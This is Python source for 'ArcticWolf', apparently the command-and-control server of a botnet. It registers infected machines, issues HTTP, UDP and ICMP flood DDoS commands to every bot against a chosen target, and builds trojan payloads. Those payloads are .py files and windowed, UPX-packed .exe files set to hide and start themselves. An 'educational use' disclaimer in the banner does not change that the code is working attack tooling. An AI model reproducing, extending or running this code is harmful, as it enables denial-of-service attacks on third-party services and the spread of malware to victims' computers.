import threading, socket, time, json
from sys import path
from platform import system as system_type
from os import system, remove, mkdir, _exit
from os import path as os_path
from shutil import rmtree, copy
from random import randint
from winsound import Beep
datasock_list = {}  # 机器字典  {No:socket}
last_Heartbeat = {}  # 记录机器的上次心跳时间
ddos_attack_list = [] # 记录ddos的攻击列表
mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood'] # 攻击方法
# 带颜色打印
def print_error(str : str):
    print('\033[0;31m' + '[-] ' + str + '\033[0m')
def print_good(str : str, add_symbol=True, line_break=False):
    print_str = '\033[0;36m' + str + '\033[0m'
    if add_symbol:
        print_str = '\033[0;36m' + '[+] ' + str + '\033[0m'
    if line_break:
        print_str = '\n' + print_str
    print(print_str)
    
def print_warn(str : str):
    print('\033[0;33m' + '[!] ' + str + '\033[0m')
def print_normal(str : str, add_symbol=True):
    if add_symbol:
        print('\033[0;34m' + '[*] ' + str + '\033[0m')
    else:
        print('\033[0;34m' + str + '\033[0m')
try:
    from colorama import init,Fore,Back,Style
    init(autoreset=True) #cmd中带颜色打印
except ImportError:
    if system_type == 'Windows':
        print_warn('colorma library import failed, print with color may be error')
#输入指令
def post_cmd():
    def gen_py(mode : str):
        def delete_lines(filename, head):
            #删除前几行测试代码 输出源文件
            with open(filename, 'r') as fin:
                a = fin.readlines()
                print_normal("Deleting test code......")
                py_txt = ''.join(a[head:-1])
            return py_txt
        # 生成.py木马文件
        # mode为写入的格式，如‘py’和‘exe’。用于病毒安装
        print_normal("Copying source......")
        py_txt = delete_lines('Resource/client_source.py', 8) #随着设置数量变化而变化 ！！！
        name = "py_virus" + str(randint(100000, 900000))
        with open(name+'.py', "w") as fw:
            print_normal('Using config ./Data/settings.json')
            fw.write(f"address = '{frpip}'\n")
            fw.write(f"port = {frpport}\n")
            fw.write(f'mode = "{mode}"\n')
            fw.write(f"Threads = {settings_data['Bots']['Threads_num']}\n") 
            fw.write(f"Attribute_hide = {settings_data['Bots']['Attribute_hide']}\n")
            fw.write(f"Self_starting = {settings_data['Bots']['Self_starting']}\n")
            fw.write(F"buffsize = {settings_data['BotNet']['Buffsize']}\n")
            # 写入设置
            print_normal(f"Writing virus to connect {ip} : {port}......")
            fw.write(py_txt)
        print_good(f"{name+'.py'} virus generated successfully")
        return name
    while True:
        command = input('ArcticWolf: >>> ')
        if command == 'ol_num':
        # 上线肉鸡总数
            print_normal(f'{len(datasock_list)} bots online')
        # elif command == 'check':
        #     send(command)
        elif command == 'ls':
        # 列出肉鸡信息
            if len(datasock_list) < 1:
                print_normal('no bots online')
            else:
                print_normal("listing all the bots")
                num = 1
                for i in datasock_list.values():
                    client_addr = i.getpeername()
                    print_normal("NO.          ip            port          host_name", False)
                    print_normal(f" {num}        {client_addr[0]}        {client_addr[1]}        {socket.gethostbyaddr(client_addr[0])[0]}", False)
                    num += 1
        elif command == "info":
            # 本机信息
            print_machine_info()
        elif command == 'reload':
            global settings_data, buffsize, last_Heartbeat
            # 重新加载设置
            Heartbeat_open_before = settings_data['BotNet']['Heartbeat']
            with open("./Data/settings.json", 'r') as f:
                settings_data = json.load(f)
            if settings_data['BotNet']['Heartbeat'] and not Heartbeat_open_before:
                print_normal('Heartbeat system started')
                last_Heartbeat = {}
                threading.Thread(target=tcplink, args=()).start() #检测是否启动心跳系统
            buffsize = settings_data['BotNet']['Buffsize']
            print_normal('Settings data reloaded')
        elif command == 'clear_history':
            global history_file
            history_file.truncate(0)
        elif command == 'ping':
            print_normal('PONG') # ???
        elif command == 'gen_py':
            gen_py('py')
        elif command == 'gen_exe':
            # 随机生成密钥		
            print_warn('Please make sure you install pyinstaller, if not, install it by "pip install pyinstaller"')
            name = gen_py('exe')
            # 生成.exe木马文件
            print_normal(f"using pyinstaller to pack the .py file")
            upx_command = input("please input your UPX dir(blank for none) >>> ")
            print_normal("Packing with pyinstaller, please wait for a while")
            if upx_command != '':
                upx_command = '--upx-dir ' + upx_command
            else:
                print_warn("TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
            try:
                basic_command = f"pyinstaller -p {path[4]}/Lib/site-packages -F {name}.py {upx_command} -w -i ./Resource/icon.ico --log-level FATAL --clean"
                system(basic_command)
            except Exception as e:
                print_error(e)
                print_error('Make sure that you install pyinstaller')
            print_normal("clearing temp files")
            copy(f'./dist/{name}.exe', f'./{name}.exe')
            remove(f"{name}.spec")
            remove(f'{name}.py')
            rmtree("build")
            rmtree("dist")
            print_good(f"{name}.exe virus generated successfully")
            
        elif command == 'attack':
            print_normal(f"Available attack method {mode_list}")
        elif command == 'shut':
            send('shut')
        elif command.split('_')[0] == 'attack':
            # ddos攻击
            target = command.split('_')[2]
            if target in ddos_attack_list:
                print_normal(f'Already attacking {target}')
            mode = command.split('_')[1]
            if mode in mode_list:
                ok = input(f'Are you sure to attack {target} using {mode}?(y,n) >>>')
                if ok == 'y' or ok == 'Y' or ok == 'yes' or ok == 'YES' or ok == '':
                    ddos_attack_list.append(target)
                    History_write( f'Start to attack {target} with {mode}', 'A')
                    send(command)
                else:
                    print_normal('All attack canceled')
            else:
                print_error(f'Unknown attack method {mode}, print out the mode list {mode_list}')
        elif command == 'stop_ddos':
            # 停止攻击
            ddos_attack_list.clear()
            History_write('I' 'Stop ddos attack')
            send(command)
        elif command.split('=')[0] == 'msg':
            # 测试命令：发送消息
            send(command)
        elif command == 'exit':
            History_write('Exit')
            send('shut')
            _exit(0)
        elif command == 'help':
            #输出help
            print_normal("help:")
            print_normal('''
    ---------Info command---------

    ls : List the bot information
    ol_num: Check bot count           
    info : Print info of this host 
                
    --------Attack command--------
                
    attack_httpflood_http://....Launch : http flood(GET request) attack 
    stop_ddos : Stop all attack command

    --------Trojan command--------
                
    gen_py : Generate .py trojen file          
    gen_exe : Generate .exe trojan file by pyinstaller
    
    --------Other command---------
                        
    exit : exit ArcticWolf
    help : print out help
    clear_history : clear history file 
    reload : Reload settings in settings.json   
               
            ''', False)
        # Check the connection oa all bots : check
        elif command == "":
            continue
        else:
            print_error(f'Unknown command {command}, You can type help to receive instructions')
# 打印本机信息
def print_machine_info():
    host_name = socket.gethostname()
    print_normal("Attack host info:")
    print_normal("Host name: %s" % host_name, False)
    print_normal("IP address: %s" % ip, False)
    print_normal("PORT number: %s" % port, False)
# 记录信息于本地历史文件中
def History_write(string, _type='I'):
    global history_file
    history_file.writelines(f"({_type})[{time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())}] : {string}\n")
    history_file.flush()
# 保持连接&心跳系统
def tcplink():
    global last_Heartbeat
    while True:
        # try:
        #     recvdata = sock.recv(buffsize).decode('utf-8')
        #     # print(recvdata)
        #     sock.close()
        #     datasock_list.remove(sock)
        #     if not recvdata:
        #         break
        # except:
        #     # sock.close()
        #     # datasock_list.remove(sock)
        #     break
        try:
            if settings_data['BotNet']['Heartbeat']:
                for sock in list(last_Heartbeat.keys()):
                    No = [k for k,v in datasock_list.items() if v==sock][0]
                    def disconnected(_type):
                        History_write(f"Bot No.{No} disconnected.", _type)
                        sock.close()
                        del datasock_list[No]
                        del last_Heartbeat[sock]
                    try:
                        if time.time() - last_Heartbeat[sock] > 20:  # 20秒内没有收到心跳消息，判断客户端掉线
                            disconnected('I')
                            break
                        send('heartbeat')  # 发送心跳消息
                        last_Heartbeat = recv('Time')
                        time.sleep(5)  # 每隔5秒发送一次心跳消息
                    except Exception as e:
                        print_error(f'Error of No.{No} : {e}')
                        disconnected('E')
                        break
            else:
                return True
        except Exception as e:
            print_error('An error occured: ' + str(e))
# 启动socket
def run():
    while True:
        clientsock, clientaddress = s.accept()
        clientsock.send('ArcticBotCheck'.encode('utf8')) #发送检查包
        if clientsock.recv(buffsize).decode('utf8') == 'CheckOK':
            biggest_No = 0
            for No in datasock_list.keys():
                if int(No) > biggest_No:
                    biggest_No = int(No)
            biggest_No += 1
            Beep(440, 100)
            History_write(f'Bot connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}')
            print_good(f"Bot No.{biggest_No} connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}", line_break=True)
            last_Heartbeat[clientsock] = time.time()
            if clientsock not in datasock_list:
                datasock_list[biggest_No] = clientsock
        else:
            clientsock.close()
            del clientsock #检查连接目标是否为ArcticWolf僵尸



# 发送指令
def send(com : str):
    try:
        No = 1
        for i in datasock_list.values():
            i.send('test'.encode('utf8'))
            No += 1 #测试机器是否在线
    except:
        i.close()
        del datasock_list[No]
        del last_Heartbeat[No]
        print_error(f'\nBot No{No} Disconnected\n')
    if com.split('_')[0] == 'attack':
        print_warn(f'doing {com.split("_")[1]} on {com.split("_")[2]}')
        for i in datasock_list.values():
            i.sendall(com.encode('utf-8'))
        print_normal('Attack command has been issued to all bots')
    elif com.split('_')[0] == 'stop':
        for i in datasock_list.values():
            i.sendall(com.encode('utf-8'))
        print_normal('Stop command has been issued to all bots')
    elif com.split('=')[0] == 'msg':
        for i in datasock_list.values():
            i.sendall(com.split('=')[1].encode('utf-8'))
    elif com == 'shut':
        No = 1
        for i in datasock_list.values():
            i.sendall(com.encode('utf-8'))
            History_write('Shuting down all the connections')
            History_write(f'Bot No.{No} Disconnected')
            print_warn('Shuting down all the connections')
            print_normal(f'Bot No.{No} Disconnected')
            del datasock_list[No]
            del last_Heartbeat[i]
            No += 1
    else:
        for i in datasock_list.values():
            i.sendall(com.encode('utf-8'))
                
# 接受回复
def recv(mode : str):
    #两种模式，Str模式返回内容， Time模式返回时间戳
    recv_dict = {}
    if mode == 'Time':
        for i in datasock_list.values():
            i.recv(buffsize)
            recv_dict[i] = time.time()
    elif mode == 'Str':
        for i in datasock_list.values():
            recv_dict[i] = i.recv(buffsize)
    else:
        raise f'Wrong mode error, wrond mode {mode} was given'
    return recv_dict # 记录每个机器返回的内容或时间戳

# 检查数据是否合法
def check_input(input_str, mode, is_default=True):
    #is_default 是否启用默认功能（空格）
    var = input(f"please set your {input_str} >>> ")
    try:
        if mode == 'int_mode':
            if var == "" and is_default:
                print_warn(f"Blank input, setting {input_str} as default {input_str} {settings_data['BotNet']['Default_port']}")
                var = settings_data['BotNet']['Default_port']
                return var
            var = int(var)
            if var <= 65535:
                return var
            else:
                print_error(f"{input_str} error, please enter again")
                check_input(input_str, mode, is_default)
        elif mode == 'ip_mode':
            if var == "" and is_default:
                print_warn(f"Blank input, setting {input_str} as default {input_str} {settings_data['BotNet']['Default_ip']}")
                var = settings_data['BotNet']['Default_ip']
                return var
            socket.inet_aton(var)
            return var
    except:
        print_error(f"{input_str} error, please enter again")
        var = check_input(input_str, mode, is_default)    
        return var

#程序入口
if __name__ == '__main__':
    print('\033[0;35m' + fr"""

===========================================================================

[ArcticWolf] : A botnet controller for Ddos attacks using frp (without server)
---------------------------------------------------------------------------
[Version] : v0.1.4     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  

===========================================================================

     
   '   '   
  / \ / \                 __   .__         __      __        .__    _____ 
  /  _  \ _______   ____ _/  |_ |__|  ____ /  \    /  \ ____  |  | _/ ____\         ))
 /  /_\  \\_  __ \_/ ___\\   __\|  |_/ ___\\   \/\/   //  _ \ |  | \   __\       ))     
/    |    \|  | \/\  \___ |  |  |  |\  \___ \        /(  <_> )|  |__|  |      ))      
\____|__  /|__|    \___  >|__|  |__| \___  > \__/\  /  \____/ |____/|__|   )) 
        \/             \/                \/       \/                       
                                             
                                                               
"""  + '\033[0m')
    # 查看是否需要初始化
    if not os_path.exists("./Data"):
        print_normal("Initializing......")
        mkdir("./Data") #创建data文件夹
        default_settings_dict = { # 默认设置文件夹
            'Attack' : {
            'Botmaster_attacks' : False
            },
            'BotNet' : {
                'Default_ip' : '127.0.0.1',
                'Default_port' : 6240,
                'Heartbeat' : True,
                'Buffsize' : 512
            },
            'Bots' : {
                'Threads_num' : 10,
                'Attribute_hide' : True,
                'Self_starting' : True
            }
        }
        with open("./Data/settings.json", 'w') as f:
            json.dump(default_settings_dict, f)
        settings_data = default_settings_dict
        history_file = open("./Data/History.config", 'w')
        History_write("Initializing")
    else:
        with open("./Data/settings.json", 'r') as f:
            settings_data = json.load(f)
        history_file = open("./Data/History.config", 'a')
    print_normal("Using settings from ./Data/settings.json")
    History_write("Opening")
    ip = check_input("ip", "ip_mode")
    port = check_input("port", "int_mode")
    frpip = check_input("frp_ip", "ip_mode")
    frpport = check_input("frp_port", "int_mode")
    buffsize = settings_data['BotNet']['Buffsize']
    print_warn("You must make sure that this host is on at anytime to recive connection")
    print_normal(f"Start listening on {ip} : {port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(5)  # 最大排队连接数
    threading.Thread(target=run, args=()).start()
    threading.Thread(target=post_cmd, args=()).start()
    if settings_data['BotNet']['Heartbeat']:
        threading.Thread(target=tcplink, args=()).start()